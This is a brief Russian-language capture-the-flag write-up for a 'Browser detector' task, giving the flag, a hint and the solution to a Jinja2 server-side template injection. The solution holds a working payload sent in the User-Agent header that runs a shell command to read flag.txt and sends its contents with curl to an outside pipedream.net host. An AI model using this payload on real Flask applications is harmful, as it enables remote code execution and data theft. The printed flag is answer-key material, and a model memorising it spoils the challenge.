# Название: Browser detector
## Описание:
И зачем оно говорит, какой у меня браузер?
### Флаг: 
CTF{th4t_do3snt_l00k_l1k3_a_br0ws3r}
### Хинт:
Слышал что нибудь про уязвимости шаблонизаторов?
### Решение:
Изменяем юзерагент на {{7*7}}, видим, что отрабатывает ssti  
Гуглим, как раскручивать ssti, а именно в jinja2 т.к. сайт на фласке + шаблонизатор можно проверить  
  
Пример решения:
`curl --user-agent "{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt | curl --data-urlencode output@- https://eonyz952zg6ppt3.m.pipedream.net', shell=True) }}" http://127.0.0.1:5000/`
